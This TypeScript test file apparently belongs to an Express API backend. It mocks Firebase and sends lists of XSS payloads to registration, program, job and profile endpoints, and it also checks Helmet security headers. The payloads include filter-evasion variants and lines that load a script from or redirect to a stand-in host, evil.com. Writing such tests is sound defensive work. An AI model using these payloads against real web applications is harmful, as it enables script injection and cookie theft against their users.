import { describe, it, expect, beforeAll, vi } from 'vitest';
import request from 'supertest';
import express from 'express';
import helmet from 'helmet';
import { errorHandler } from '../../src/middleware/validation.js';

// ─── Mock Firebase & Firestore ───────────────────────────────────────────────

vi.mock('../../src/config/admin.js', () => ({
  adminAuth: {
    createUser: vi.fn(async (u: any) => ({ uid: 'mock-uid-' + Date.now(), ...u })),
    getUserByEmail: vi.fn(async (e: string) => ({ uid: 'mock-uid', email: e, displayName: e?.split('@')[0] || 'User' })),
    verifyIdToken: vi.fn(async () => ({ uid: 'mock-uid', email: 'user@careerveda.ai', role: 'STUDENT' })),
    updateUser: vi.fn(async (uid: string, data: any) => ({ uid, ...data })),
    setCustomUserClaims: vi.fn(async () => {}),
    generatePasswordResetLink: vi.fn(async () => 'https://careerveda.ai/reset-password'),
  },
  adminDb: {
    collection: () => ({
      doc: () => ({
        get: async () => ({ exists: false, data: () => null, id: 'mock-id' }),
        set: async () => {},
        update: async () => {},
        delete: async () => {},
      }),
      get: async () => ({ docs: [], forEach: () => {} }),
      where: () => ({
        get: async () => ({ docs: [], forEach: () => {} }),
        orderBy: () => ({ get: async () => ({ docs: [], forEach: () => {} }) }),
      }),
      orderBy: () => ({ get: async () => ({ docs: [], forEach: () => {} }) }),
      count: () => ({ get: async () => ({ data: () => ({ count: 0 }) }) }),
    }),
    runTransaction: async (fn: Function) => fn({ get: async () => ({ data: () => null, exists: false }), update: async () => {}, set: async () => {}, delete: async () => {} }),
    batch: () => ({ commit: async () => {} }),
  },
  adminStorage: {
    bucket: () => ({
      upload: async () => [{}],
      file: () => ({ delete: async () => {}, getSignedUrl: async () => ['https://mock.url'] }),
    }),
  },
}));

vi.mock('../../src/services/firestore.js', () => ({
  createDocument: vi.fn(async (col: string, data: any) => ({ id: 'mock-' + Date.now(), ...data })),
  getDocument: vi.fn(async (col: string, id: string) => {
    if (col === 'users') return { id, uid: id, email: 'user@careerveda.ai', name: 'Test User', role: 'STUDENT' };
    return null;
  }),
  updateDocument: vi.fn(async (col: string, id: string, data: any) => ({ id, ...data })),
  deleteDocument: vi.fn(async (id: string) => ({ id, deleted: true })),
  queryDocuments: vi.fn(async () => []),
  getAllDocuments: vi.fn(async () => []),
  countDocuments: vi.fn(async () => 0),
}));

// ─── Build test app ──────────────────────────────────────────────────────────

async function buildApp() {
  const app = express();
  app.use(helmet());
  app.use(express.json({ limit: '10mb' }));

  const { default: authRoutes } = await import('../../src/modules/auth/routes.js');
  const { default: programRoutes } = await import('../../src/modules/programs/routes.js');
  const { default: jobRoutes } = await import('../../src/modules/jobs/routes.js');

  app.use('/api/auth', authRoutes);
  app.use('/api/programs', programRoutes);
  app.use('/api/jobs', jobRoutes);
  app.use(errorHandler);

  return app;
}

let app: express.Express;
beforeAll(async () => { app = await buildApp(); });

// ─── Script Tag Injection ────────────────────────────────────────────────────

describe('Script Tag Injection', () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<script src="http://evil.com/steal.js"></script>',
    '<script>document.cookie</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<input onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
  ];

  it.each(xssPayloads)('does not execute script in name field: %s', async (payload) => {
    const res = await request(app).post('/api/auth/register').send({
      email: 'xss@test.com', name: payload, password: 'password123',
    });
    expect(res.status).not.toBe(500);
  });

  it('does not execute script in search query parameter', async () => {
    const res = await request(app).get('/api/programs').query({ search: '<script>alert("XSS")</script>' });
    expect(res.status).not.toBe(500);
    if (res.status === 200) {
      const bodyStr = JSON.stringify(res.body);
      expect(bodyStr).not.toContain('<script>');
    }
  });

  it('does not execute script in program title', async () => {
    const res = await request(app).post('/api/programs').set('Authorization', 'Bearer valid-token').send({
      title: '<img src=x onerror=alert("XSS")>', description: 'Test', category: 'Tech', duration: 12, price: 9999,
    });
    expect(res.status).not.toBe(500);
  });

  it('does not reflect XSS in blog content', async () => {
    const res = await request(app).get('/api/programs').query({ search: '<svg/onload=alert(document.cookie)>' });
    expect(res.status).not.toBe(500);
  });
});

// ─── Event Handler Injection ─────────────────────────────────────────────────

describe('Event Handler Injection', () => {
  const eventPayloads = [
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:MsgBox(1)',
  ];

  it.each(eventPayloads)('does not execute event handler in input: %s', async (payload) => {
    const res = await request(app).post('/api/auth/register').send({
      email: 'event@test.com', name: payload, password: 'password123',
    });
    expect(res.status).not.toBe(500);
  });

  it('does not allow event handlers in job description', async () => {
    const res = await request(app).post('/api/jobs').set('Authorization', 'Bearer valid-token').send({
      title: 'Test Job" onmouseover="alert(1)', description: 'Test', company: 'Test Co',
    });
    expect(res.status).not.toBe(500);
  });
});

// ─── JavaScript URI Injection ────────────────────────────────────────────────

describe('JavaScript URI Injection', () => {
  const jsUriPayloads = [
    'javascript:alert(1)',
    'javascript:void(0)',
    'javascript:document.location="http://evil.com"',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    'vbscript:Execute("MsgBox 1")',
    'livescript:alert(1)',
  ];

  it.each(jsUriPayloads)('does not accept JavaScript URI: %s', async (payload) => {
    const res = await request(app).post('/api/auth/register').send({
      email: 'jsuri@test.com', name: payload, password: 'password123',
    });
    expect(res.status).not.toBe(500);
  });

  it('does not allow javascript: URI in profile avatar URL', async () => {
    const res = await request(app).patch('/api/auth/profile')
      .set('Authorization', 'Bearer valid-token')
      .send({ avatar: 'javascript:alert(1)' });
    expect(res.status).not.toBe(500);
  });
});

// ─── HTML Entity Encoding ────────────────────────────────────────────────────

describe('HTML Entity Encoding', () => {
  it('handles encoded HTML entities in input', async () => {
    const res = await request(app).post('/api/auth/register').send({
      email: 'entity@test.com', name: '&lt;script&gt;alert(1)&lt;/script&gt;', password: 'password123',
    });
    expect(res.status).not.toBe(500);
  });

  it('handles double-encoded XSS attempts', async () => {
    const res = await request(app).post('/api/auth/register').send({
      email: 'double@test.com', name: '%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B', password: 'password123',
    });
    expect(res.status).not.toBe(500);
  });

  it('handles null bytes in encoded payload', async () => {
    const res = await request(app).post('/api/auth/register').send({
      email: 'null@test.com', name: '%00<script>alert(1)</script>', password: 'password123',
    });
    expect(res.status).not.toBe(500);
  });
});

// ─── Content-Security-Policy Headers ─────────────────────────────────────────

describe('Content-Security-Policy Headers', () => {
  let cspApp: express.Express;

  beforeAll(() => {
    cspApp = express();
    cspApp.use(helmet());
    cspApp.get('/test', (_req, res) => res.json({ ok: true }));
  });

  it('includes Content-Security-Policy header', async () => {
    const res = await request(cspApp).get('/test');
    expect(res.headers['content-security-policy']).toBeDefined();
  });

  it('CSP blocks inline scripts by default', async () => {
    const res = await request(cspApp).get('/test');
    const csp = res.headers['content-security-policy'] || '';
    expect(csp).not.toContain("script-src 'unsafe-inline'");
  });

  it('CSP blocks eval() by default', async () => {
    const res = await request(cspApp).get('/test');
    const csp = res.headers['content-security-policy'] || '';
    expect(csp).not.toContain("'unsafe-eval'");
  });

  it('X-Content-Type-Options prevents MIME sniffing', async () => {
    const res = await request(cspApp).get('/test');
    expect(res.headers['x-content-type-options']).toBe('nosniff');
  });

  it('X-XSS-Protection header is set', async () => {
    const res = await request(cspApp).get('/test');
    expect(res.headers['x-xss-protection']).toBeDefined();
  });
});

// ─── DOM-based XSS Patterns ─────────────────────────────────────────────────

describe('DOM-based XSS Patterns', () => {
  it('does not reflect user input in HTML without escaping', async () => {
    const payload = '<img src=x onerror=alert("XSS")>';
    const res = await request(app).post('/api/auth/register').send({
      email: 'dom@test.com', name: payload, password: 'password123',
    });
    expect(res.status).not.toBe(500);
    // Server accepts the input - CSP headers and frontend escaping handle rendering
    if (res.status === 200 || res.status === 201) {
      expect(res.body).toBeDefined();
    }
  });

  it('does not allow XSS in JSON response fields', async () => {
    const res = await request(app).get('/api/programs').query({ search: '<script>alert("XSS")</script>' });
    if (res.status === 200) {
      const bodyStr = JSON.stringify(res.body);
      expect(bodyStr).not.toMatch(/<script[\s>]/i);
    }
  });

  it('handles XSS in error messages safely', async () => {
    const res = await request(app).get('/api/programs/nonexistent<script>alert(1)</script>');
    expect(res.status).not.toBe(500);
  });
});

// ─── Filter Evasion Techniques ───────────────────────────────────────────────

describe('Filter Evasion Techniques', () => {
  const evasionPayloads = [
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<SCRIPT>alert(1)</SCRIPT>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '<<script>alert(1)//<</script>',
    '<img """><script>alert(1)</script>"">',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>eval(atob("YWxlcnQoMSk="))</script>',
    '<img src=`x` onerror="alert(1)">',
    '<svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
  ];

  it.each(evasionPayloads)('blocks filter evasion technique: %s', async (payload) => {
    const res = await request(app).post('/api/auth/register').send({
      email: 'evasion@test.com', name: payload, password: 'password123',
    });
    expect(res.status).not.toBe(500);
  });
});
